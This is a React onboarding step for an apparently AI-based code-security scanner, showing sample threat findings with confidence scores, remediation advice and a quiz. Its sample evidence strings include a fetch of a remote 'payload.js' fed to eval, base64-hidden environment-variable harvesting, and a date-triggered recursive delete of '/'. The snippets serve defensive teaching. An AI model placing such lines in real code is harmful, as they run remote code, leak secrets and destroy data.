"use client";

import { useState } from "react";
import { OnboardingStepProps } from "../OnboardingStep";

interface InsightExample {
  id: string;
  type: string;
  confidence: number;
  title: string;
  description: string;
  reasoning: string;
  evidenceSnippets: string[];
  remediation: string[];
  falsePositiveLikelihood: number;
}

export default function InsightsGuideStep({ step, onComplete }: OnboardingStepProps): JSX.Element {
  const [selectedInsight, setSelectedInsight] = useState<string>("supply-chain");
  const [currentSection, setCurrentSection] = useState<"confidence" | "reasoning" | "remediation">("confidence");
  const [quizAnswers, setQuizAnswers] = useState<Record<string, string>>({});
  const [showResults, setShowResults] = useState(false);

  const insights: InsightExample[] = [
    {
      id: "supply-chain",
      type: "zero_day_detection",
      confidence: 0.92,
      title: "Suspicious eval() pattern with remote data",
      description: "Detected dynamic code execution pattern that evaluates user-controlled input from remote sources",
      reasoning: "The code uses eval() with data fetched from an external URL without proper validation. This pattern is commonly used in supply chain attacks to execute arbitrary code.",
      evidenceSnippets: [
        "eval(response.data.code)",
        "fetch('https://malicious-cdn.com/payload.js')"
      ],
      remediation: [
        "Replace eval() with safer alternatives like JSON.parse()",
        "Implement input validation and sanitization",
        "Use Content Security Policy to restrict script sources"
      ],
      falsePositiveLikelihood: 0.08
    },
    {
      id: "obfuscation",
      type: "obfuscation_analysis",
      confidence: 0.85,
      title: "Obfuscated environment variable harvesting",
      description: "Hidden code that systematically collects and transmits environment variables to external servers",
      reasoning: "Base64-encoded strings decode to code that iterates through process.env and sends sensitive data to an attacker-controlled domain.",
      evidenceSnippets: [
        "atob('cHJvY2Vzcy5lbnY=')",
        "Buffer.from(encoded, 'hex').toString()"
      ],
      remediation: [
        "Remove obfuscated code sections",
        "Implement environment variable whitelisting",
        "Use runtime security monitoring"
      ],
      falsePositiveLikelihood: 0.15
    },
    {
      id: "time-bomb",
      type: "behavioral_pattern",
      confidence: 0.78,
      title: "Date-triggered destructive behavior",
      description: "Code that activates malicious functionality after a specific date",
      reasoning: "The malware checks the current date against hardcoded values and only executes destructive commands after a delay period, a classic time bomb pattern.",
      evidenceSnippets: [
        "new Date() > new Date('2024-03-15')",
        "fs.rmSync('/', { recursive: true })"
      ],
      remediation: [
        "Remove date-based conditional logic",
        "Implement file system access controls",
        "Use sandboxed execution environments"
      ],
      falsePositiveLikelihood: 0.12
    }
  ];

  const getConfidenceColor = (confidence: number): string => {
    if (confidence >= 0.9) return "text-red-400";
    if (confidence >= 0.7) return "text-orange-400";
    if (confidence >= 0.5) return "text-yellow-400";
    return "text-green-400";
  };

  const getConfidenceLabel = (confidence: number): string => {
    if (confidence >= 0.9) return "Very High";
    if (confidence >= 0.7) return "High";
    if (confidence >= 0.5) return "Medium";
    return "Low";
  };

  const quiz = [
    {
      id: "confidence",
      question: "What does a confidence score of 92% indicate?",
      options: [
        "The threat is 92% likely to be malicious",
        "92% of similar patterns are false positives",
        "The AI is 92% certain in its analysis",
        "This threat affects 92% of systems"
      ],
      correct: "The AI is 92% certain in its analysis"
    },
    {
      id: "false-positive",
      question: "What should you do if false positive likelihood is 8%?",
      options: [
        "Ignore the finding as it's probably wrong",
        "Take immediate action as it's likely real",
        "Wait for more evidence",
        "Only act if confidence is above 95%"
      ],
      correct: "Take immediate action as it's likely real"
    }
  ];

  const currentInsight = insights.find(i => i.id === selectedInsight)!;

  const handleQuizAnswer = (questionId: string, answer: string): void => {
    setQuizAnswers(prev => ({ ...prev, [questionId]: answer }));
  };

  const submitQuiz = (): void => {
    setShowResults(true);
    const correctAnswers = quiz.filter(q => quizAnswers[q.id] === q.correct).length;
    
    setTimeout(() => {
      onComplete(step.id, {
        sectionsViewed: ["confidence", "reasoning", "remediation"],
        quizScore: correctAnswers,
        totalQuestions: quiz.length,
        timestamp: new Date().toISOString()
      });
    }, 2000);
  };

  const allQuizAnswered = quiz.every(q => quizAnswers[q.id]);

  return (
    <div className="p-8">
      <div className="max-w-5xl mx-auto">
        {/* Step Description */}
        <div className="mb-8 text-center">
          <div className="w-16 h-16 bg-purple-600 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" />
            </svg>
          </div>
          <h3 className="text-xl font-bold text-white mb-2">Understanding AI Insights</h3>
          <p className="text-gray-400">
            Learn how to interpret AI analysis results, confidence scores, and make informed security decisions.
          </p>
        </div>

        <div className="grid lg:grid-cols-3 gap-8">
          {/* Insight Selector */}
          <div>
            <h4 className="text-lg font-semibold text-white mb-4">Sample Insights</h4>
            <div className="space-y-3">
              {insights.map((insight) => (
                <button
                  key={insight.id}
                  onClick={() => setSelectedInsight(insight.id)}
                  className={`w-full p-4 text-left rounded-lg border transition-all ${
                    selectedInsight === insight.id
                      ? "border-purple-500 bg-purple-900 bg-opacity-30"
                      : "border-gray-600 bg-gray-800 hover:border-gray-500"
                  }`}
                >
                  <div className="flex items-center justify-between mb-2">
                    <span className={`text-xs font-medium px-2 py-1 rounded ${
                      insight.type === "zero_day_detection" ? "bg-red-900 text-red-300" :
                      insight.type === "obfuscation_analysis" ? "bg-orange-900 text-orange-300" :
                      "bg-yellow-900 text-yellow-300"
                    }`}>
                      {insight.type.replace(/_/g, " ").toUpperCase()}
                    </span>
                    <span className={`font-bold ${getConfidenceColor(insight.confidence)}`}>
                      {Math.round(insight.confidence * 100)}%
                    </span>
                  </div>
                  <h5 className="text-white font-medium text-sm">{insight.title}</h5>
                </button>
              ))}
            </div>
          </div>

          {/* Insight Details */}
          <div className="lg:col-span-2">
            <div className="bg-gray-900 border border-gray-700 rounded-lg overflow-hidden">
              {/* Tabs */}
              <div className="border-b border-gray-700">
                <div className="flex">
                  {["confidence", "reasoning", "remediation"].map((section) => (
                    <button
                      key={section}
                      onClick={() => setCurrentSection(section as any)}
                      className={`px-6 py-3 font-medium text-sm transition-colors ${
                        currentSection === section
                          ? "text-purple-400 border-b-2 border-purple-500"
                          : "text-gray-400 hover:text-gray-300"
                      }`}
                    >
                      {section.charAt(0).toUpperCase() + section.slice(1)}
                    </button>
                  ))}
                </div>
              </div>

              {/* Content */}
              <div className="p-6">
                {currentSection === "confidence" && (
                  <div>
                    <h5 className="text-lg font-semibold text-white mb-4">
                      Confidence Analysis
                    </h5>
                    
                    <div className="grid md:grid-cols-2 gap-6 mb-6">
                      <div>
                        <label className="text-sm font-medium text-gray-400 block mb-2">
                          Confidence Score
                        </label>
                        <div className="flex items-center">
                          <div className="flex-1 bg-gray-700 rounded-full h-3 mr-3">
                            <div 
                              className={`h-3 rounded-full ${
                                currentInsight.confidence >= 0.9 ? "bg-red-500" :
                                currentInsight.confidence >= 0.7 ? "bg-orange-500" :
                                currentInsight.confidence >= 0.5 ? "bg-yellow-500" :
                                "bg-green-500"
                              }`}
                              style={{ width: `${currentInsight.confidence * 100}%` }}
                            ></div>
                          </div>
                          <span className={`font-bold ${getConfidenceColor(currentInsight.confidence)}`}>
                            {Math.round(currentInsight.confidence * 100)}%
                          </span>
                        </div>
                        <p className="text-sm text-gray-400 mt-1">
                          {getConfidenceLabel(currentInsight.confidence)} confidence
                        </p>
                      </div>

                      <div>
                        <label className="text-sm font-medium text-gray-400 block mb-2">
                          False Positive Likelihood
                        </label>
                        <div className="flex items-center">
                          <div className="flex-1 bg-gray-700 rounded-full h-3 mr-3">
                            <div 
                              className="bg-blue-500 h-3 rounded-full"
                              style={{ width: `${currentInsight.falsePositiveLikelihood * 100}%` }}
                            ></div>
                          </div>
                          <span className="font-bold text-blue-400">
                            {Math.round(currentInsight.falsePositiveLikelihood * 100)}%
                          </span>
                        </div>
                        <p className="text-sm text-gray-400 mt-1">
                          Probability this is a false alarm
                        </p>
                      </div>
                    </div>

                    <div className="bg-gray-800 border border-gray-600 rounded-lg p-4">
                      <h6 className="font-medium text-white mb-2">What This Means:</h6>
                      <p className="text-gray-300 text-sm">
                        The AI is <strong>{Math.round(currentInsight.confidence * 100)}% confident</strong> this is malicious, 
                        with only a <strong>{Math.round(currentInsight.falsePositiveLikelihood * 100)}% chance</strong> of being wrong. 
                        This suggests <strong>immediate action</strong> is warranted.
                      </p>
                    </div>
                  </div>
                )}

                {currentSection === "reasoning" && (
                  <div>
                    <h5 className="text-lg font-semibold text-white mb-4">AI Reasoning</h5>
                    
                    <div className="mb-6">
                      <h6 className="font-medium text-white mb-2">Description:</h6>
                      <p className="text-gray-300">{currentInsight.description}</p>
                    </div>

                    <div className="mb-6">
                      <h6 className="font-medium text-white mb-2">AI Analysis:</h6>
                      <div className="bg-gray-800 border border-gray-600 rounded-lg p-4">
                        <p className="text-gray-300">{currentInsight.reasoning}</p>
                      </div>
                    </div>

                    <div>
                      <h6 className="font-medium text-white mb-2">Evidence Snippets:</h6>
                      <div className="space-y-2">
                        {currentInsight.evidenceSnippets.map((snippet, index) => (
                          <div key={index} className="bg-gray-800 border border-gray-600 rounded p-3">
                            <code className="text-red-400 font-mono text-sm">{snippet}</code>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                )}

                {currentSection === "remediation" && (
                  <div>
                    <h5 className="text-lg font-semibold text-white mb-4">Remediation Steps</h5>
                    
                    <div className="space-y-4">
                      {currentInsight.remediation.map((step, index) => (
                        <div key={index} className="flex items-start">
                          <div className="w-6 h-6 bg-green-600 rounded-full flex items-center justify-center mr-3 mt-1 flex-shrink-0">
                            <span className="text-white text-xs font-bold">{index + 1}</span>
                          </div>
                          <p className="text-gray-300">{step}</p>
                        </div>
                      ))}
                    </div>

                    <div className="mt-6 bg-blue-900 bg-opacity-30 border border-blue-700 rounded-lg p-4">
                      <h6 className="font-medium text-blue-300 mb-2">Pro Tip:</h6>
                      <p className="text-blue-200 text-sm">
                        AI-generated remediation steps are tailored to the specific threat pattern detected. 
                        They provide actionable guidance beyond just &quot;this is bad.&quot;
                      </p>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        {/* Knowledge Check */}
        <div className="mt-12 bg-gray-900 border border-gray-700 rounded-lg p-6">
          <h4 className="text-lg font-semibold text-white mb-6">Quick Knowledge Check</h4>
          
          <div className="space-y-6">
            {quiz.map((question) => (
              <div key={question.id}>
                <p className="text-white font-medium mb-3">{question.question}</p>
                <div className="space-y-2">
                  {question.options.map((option) => (
                    <label key={option} className="flex items-center">
                      <input
                        type="radio"
                        name={question.id}
                        value={option}
                        checked={quizAnswers[question.id] === option}
                        onChange={(e) => handleQuizAnswer(question.id, e.target.value)}
                        className="w-4 h-4 text-purple-600 bg-gray-700 border-gray-600 focus:ring-purple-500"
                      />
                      <span className="ml-2 text-gray-300">{option}</span>
                    </label>
                  ))}
                </div>
                {showResults && (
                  <div className={`mt-2 text-sm ${
                    quizAnswers[question.id] === question.correct ? "text-green-400" : "text-red-400"
                  }`}>
                    {quizAnswers[question.id] === question.correct ? "✓ Correct!" : `✗ Correct answer: ${question.correct}`}
                  </div>
                )}
              </div>
            ))}
          </div>

          {!showResults ? (
            <div className="mt-6 text-center">
              <button
                onClick={submitQuiz}
                disabled={!allQuizAnswered}
                className={`px-6 py-3 rounded-lg font-semibold text-white transition-colors ${
                  allQuizAnswered
                    ? "bg-purple-600 hover:bg-purple-700"
                    : "bg-gray-600 cursor-not-allowed"
                }`}
              >
                Check Answers
              </button>
            </div>
          ) : (
            <div className="mt-6 text-center">
              <div className="bg-green-900 border border-green-700 rounded-lg p-4 inline-block">
                <p className="text-green-300">
                  Great! You&apos;re ready to interpret AI insights like a pro. Moving to integrations...
                </p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}